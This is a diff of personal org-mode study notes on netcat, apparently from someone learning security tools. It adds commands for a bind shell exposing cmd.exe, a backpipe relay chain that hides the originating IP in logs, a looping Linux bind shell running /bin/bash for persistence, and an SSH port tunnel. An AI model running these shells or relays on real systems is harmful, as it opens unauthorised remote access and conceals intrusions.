@@ -4,9 +4,8 @@
 * netcat							     :net:op:
 * Description
 * Usage
-> netcat <options> host port
 
-> netcat <options> host p_start-p_finish
+> netcat <options> host port
 
 ** Send a udp packet instead of initiating with tcp connection
 #+BEGIN_SRC sh
@@ -69,8 +68,58 @@ netcat -l 4444 < index.html
 while true; do netcat -l 4444 < index.html; done
 #+END_SRC
 
+** redirect a windows shell
+#+BEGIN_SRC sh
+nc -l -p 9999 -e cmd.exe
+#+END_SRC
+- ensure that the version of netcat that you use has the execute flag compiled
+- always keep in mind that you are not in a terminal, but a cmd over the network
+
+** using netcat as a relay
+Machine 1 - 192.168.0.10
+#+BEGIN_SRC sh
+netcat 192.168.0.11 -p 7777
+#+END_SRC
+
+Machine 2 - 192.168.0.11
+#+BEGIN_SRC sh
+netcat -l -p 7777 0<backpipe | netcat 192.168.0.12 8888 1>backpipe
+#+END_SRC
+- thiw now passes traffice between machine 1 and machine 2
+
+Machine 3 - 192.168.0.12
+#+BEGIN_SRC sh
+netcat -L -p 9999 -e cmd.exe
+#+END_SRC
+L - persistent (only available on windows)
+
+-for persistents on linux the script below can be used
+#+BEGIN_SRC sh
+while [ 1 ]; do echo "Netcat has 9 lives. Port is 7777"; nc -l -p 777 -e /bin/bash; done
+#+END_SRC
+
+All traffic logged on machine 3 would only show the ip for Machine 2
+
+** persistence
+- Windows
+#+BEGIN_SRC sh
+netcat -L -p 9999 -e cmd.exe
+#+END_SRC
+L - persistent (only available on windows)
+
+- Linux - 9lives.sh
+#+BEGIN_SRC sh
+while [ 1 ]; do echo "Netcat has 9 lives. Port is 7777"; nc -l -p 777 -e /bin/bash; done
+#+END_SRC
+
+** tunneling with ssh
+#+BEGIN_SRC sh
+ssh -i Documents/id_rsa -L 8888:172.168.0.129:80 alick@172.16.0.134
+#+END_SRC
 * Lecture
 * Tutorial
+** [[https://www.youtube.com/watch?v%3Dqo_sFS2A-mI][Introduction to Data Transfer with NetCat]]
+
 * Books
 [[file://home/crito/Documents/Security/Tools/Netcat_Starter.pdf][Netcat Starter]]
 [[file://home/crito/Documents/Security/Tools/Netcat_Power_Tools.pdf][Netcat Power Tools]]
